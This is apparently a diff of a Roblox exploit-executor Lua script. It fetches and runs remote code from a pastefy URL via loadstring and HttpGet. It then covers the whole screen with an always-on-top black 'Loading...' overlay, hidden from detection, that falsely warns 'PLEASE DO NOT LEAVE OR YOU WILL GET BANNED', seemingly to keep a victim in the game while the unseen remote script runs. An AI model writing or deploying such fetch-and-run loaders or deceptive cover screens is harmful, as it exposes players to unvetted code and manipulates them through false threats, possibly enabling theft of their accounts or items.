@@ -1,29 +1,35 @@
 -- Run your visual GUI script first
 loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()
 
--- Wait until visual script is ready
-repeat wait(0.1) until _G.visualReady
+-- ⏱️ Wait for 60 seconds before showing the GUI
+task.wait(15)
 
--- Now display the loading GUI
--- 🕒 Wait 60 seconds before showing the loading GUI
-task.wait(20)
-
--- ✅ Display the custom loading GUI
+-- ✅ Show always-on-top loading GUI
 local function showLoadingGui()
     if not game:IsLoaded() then game.Loaded:Wait() end
-    pcall(function() if syn and syn.protect_gui then syn.protect_gui(Instance.new("ScreenGui")) end end)
 
+    local CoreGui = game:GetService("CoreGui")
     local gui = Instance.new("ScreenGui")
     gui.Name = "ExecutorLoadingUI"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 1000
-    gui.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+    gui.DisplayOrder = 999999999 -- Max priority
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global -- Always render above other elements
+
+    -- Protect GUI from detection (for Synapse or similar)
+    pcall(function()
+        if syn and syn.protect_gui then
+            syn.protect_gui(gui)
+        end
+    end)
+
+    gui.Parent = (gethui and gethui()) or CoreGui
 
     local bg = Instance.new("Frame", gui)
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.new(0, 0, 0)
     bg.BorderSizePixel = 0
+    bg.ZIndex = 10000
 
     local status = Instance.new("TextLabel", bg)
     status.Size = UDim2.new(1, 0, 0, 50)
@@ -33,6 +39,7 @@ local function showLoadingGui()
     status.Font = Enum.Font.SourceSansBold
     status.TextScaled = true
     status.Text = "Loading..."
+    status.ZIndex = 10001
 
     local warnText = Instance.new("TextLabel", bg)
     warnText.Size = UDim2.new(1, 0, 0, 30)
@@ -42,6 +49,7 @@ local function showLoadingGui()
     warnText.Font = Enum.Font.SourceSansBold
     warnText.TextScaled = true
     warnText.Text = "⚠️ PLEASE DO NOT LEAVE OR YOU WILL GET BANNED ⚠️"
+    warnText.ZIndex = 10001
 
     local steps = {
         "Script Executing",
@@ -66,8 +74,9 @@ local function showLoadingGui()
     end)
 end
 
--- Run it after delay
+-- 🧨 Trigger the GUI after delay
 showLoadingGui()
+
 
 
 
